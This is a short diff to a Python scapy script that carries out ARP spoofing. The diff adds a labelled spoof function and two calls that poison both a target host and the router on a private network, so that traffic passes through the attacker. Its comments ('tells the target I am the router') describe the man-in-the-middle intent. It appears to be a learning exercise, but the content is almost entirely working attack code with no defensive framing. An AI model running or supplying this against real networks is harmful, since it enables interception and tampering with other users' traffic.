@@ -10,10 +10,17 @@ def get_mac(ip):
     answered_list = scapy.srp(broadcast_arp_request, timeout=2, verbose=False)[0]
     return answered_list[0][1].hwsrc
 
-def spoof(target_ip, spoof_ip):
+def spoof(target_ip, spoof_ip, version):
     target_mac = get_mac(target_ip)
+    print("I am the " + version + " mac: " + str(target_mac))
     # Send packet to Client (target_ip), telling it I have the Router (gateway) MAC Address.
     # ARP fields: op=2 (ARP Response). pdst=[TARGET_IP]. hwdst=[TARGET_MAC].
-    # psrc=[SOURCE_IP](GATEWAY_IP)
+    # psrc=[SPOOF_IP](GATEWAY_IP) > tells the target I am the router
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet)
+
+# Tell the target I am the router.
+spoof("192.168.63.174","192.168.63.2", "Target (Victim)" )
+# Tell the router I am the target.
+spoof("192.168.63.2","192.168.63.174", "Router" )
+
